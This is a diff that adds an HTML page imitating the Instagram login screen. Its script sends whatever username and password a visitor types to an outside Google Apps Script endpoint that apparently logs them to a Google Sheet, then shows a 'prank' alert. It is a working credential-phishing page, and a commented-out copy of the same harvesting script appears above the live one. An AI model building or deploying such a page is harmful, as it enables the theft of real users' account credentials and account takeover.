@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Instagram Login</title>
+</head>
+
+<body>
+    <main>
+        <img src="IG.jpeg" alt="" class="phoneImg">
+        <div class="form-div">
+            <form name="submit-to-google-sheet">
+                <img class="instaLogo" src="instaLogo.png" alt="logo">
+
+                <input type="text" class="input" name="username" placeholder="phone number, username, or email" required>
+                <input type="password" class="input" name="password" required placeholder="Password">
+                <button class="login-btn">Log In</button>
+                <p id="or">or</p>
+                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
+            </form>
+            <div class="sign-up">
+                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
+            </div>
+            <div class="get-app">
+                <p>Get the app</p>
+                <div class="store">
+                    <img id="play" src="playStore.png" alt="">
+                    <img id="microsoft" src="getMicrosoft.png" alt="">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzZvIwToKCfy8n1ONRh1tctBHNlavn--CAoCsnAuIUa8972BNWh_FP0oPvudW6-uzg4/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script> -->
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzZvIwToKCfy8n1ONRh1tctBHNlavn--CAoCsnAuIUa8972BNWh_FP0oPvudW6-uzg4/exec'
+    const form = document.forms['submit-to-google-sheet']
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => {
+                if (response.ok) {
+                    // Login was successful, show a pop-up message
+                    alert('Prank hogya ap kai sath!');
+                } else {
+                    console.error('Error!', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error!', error.message));
+    });
+</script>
+
+      
+</body>
+
+</html>
